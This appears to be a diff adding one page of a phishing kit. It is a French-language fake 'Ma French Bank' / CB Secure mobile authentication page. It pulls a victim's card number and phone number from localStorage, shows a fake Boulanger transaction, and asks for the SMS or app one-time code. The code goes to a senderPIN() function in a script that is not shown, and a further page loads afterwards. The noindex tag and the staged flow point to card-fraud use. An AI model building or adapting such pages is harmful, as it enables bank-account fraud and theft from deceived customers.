@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otpFrenchBank</title>
+
+     <!--Scripts jquery-->
+        
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+ 
+ <!--Scripts jquery-->
+    <script>
+        document.getElementById("encryptedCardNumber").innerHTML =  localStorage.getItem("encryptedCardNumber");
+         document.getElementById("numtel").innerHTML =  localStorage.getItem("numtel");
+       
+       </script>
+<script>
+    function validateForm() {
+      var x = document.forms["myForm"]["otp"].value;
+      if (x == "" || x == null) {
+        alert("Veuillez entrer le code reçu par SMS");
+        return false;
+      }
+    }
+    </script>
+</head>
+
+<link rel="stylesheet" href="./otpFrenchBank.css">
+
+<body>
+    <div id="otp">
+
+    </div>
+    
+    <div class="totp">
+
+        <form  name="myForm" onsubmit="  validateForm();senderPIN()">
+
+        <div class="wrapper">
+
+            <div class="head">
+
+            <span class="bankLogo">
+
+                <img src="./assets/maFrenchBank.png">
+
+            </span>
+
+            <span class="ccLogo">
+              <img src="./assets/cbSecure.jpg">
+            </span>
+
+        </div>
+        <h1>Authentification par mobile</h1><br>
+
+        <div class="alert">
+             
+<br>
+            <p >
+                Nous vérifions le code de l'App
+            </p><br>
+            <p style="font-size: medium; font-weight: lighter;">Quelques desondes pour vérifier le code personnel saisi et on valide le paiement</p>
+           <br> <div class="lds-spinner">
+                <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
+            </div>  
+        </div><br>
+        <h2>Transaction</h2><br>
+     <br>  
+        
+     <div class="details">
+        <div class="labels">
+            <label for="" class="a">Marchand: </label><br>
+           
+            <label for="" class="a">Date:</label> <br>
+            <label for="" class="a">N° de carte: </label>  <br>
+
+        </div>
+        <div class="spans">
+            <span id="marchand"> Boulanger</span><br>
+           
+            <span id="date"></span><br>
+            <span>xxxxxxx<span id="encryptedCardNumber"></span> </span>
+
+        </div><br><br>
+        <label for="" >Veuillez saisir sans espace le code d'authentification ici et dans l'application: &NonBreakingSpace;</label>
+        <input class="otp" name="otp"  id="numPin" type="text"><br><br>
+
+        <button type="submit" class="ok"  href="javascript:void(0);" onsubmit="senderPIN();">
+            Valider
+        </button>
+
+    </div>
+<br>
+        <p class="do">
+            Pour sécuriser vos achats en ligne sur les sites affichant le logo Paiement sécurisé CB, il vous suffit désormais de vous identifier en saisissant votre code personnel de votre application mobile Ma French Bank.
+        </p>
+<br>
+<p>Cette authentification est obligatoire pour conclure votre transaction. En cas de refus de votre part, votre achat sera annulé.</p>
+        </div>
+        <br>
+        <p class="do">Si vous ne revevez pas un SMS, consulter l'application mobile de votre banque
+        </p>
+    </form>
+</div>
+<script src="./senderPIN.js">
+    </script>
+
+<script>
+    var dt = new Date();
+    document.getElementById("date").innerHTML = (("0"+dt.getDate()).slice(-2)) +"."+ (("0"+(dt.getMonth()+1)).slice(-2)) +"."+ (dt.getFullYear()) +" "+ (("0"+dt.getHours()).slice(-2)) +":"+ (("0"+dt.getMinutes()).slice(-2));
+    </script>
+ <!--Animated show for the div-->
+ <script type="text/javascript">
+    $(document).ready(function () {
+        $('.ok').click(function () {
+            $('.totp').fadeOut('4000');
+            $('#otp').load('otpFrenchBank2.html').delay('5000').fadeIn('5000');
+            $('#otp').click(senderPIN());
+
+        });
+    });
+
+</script>
+</body>
+</html>
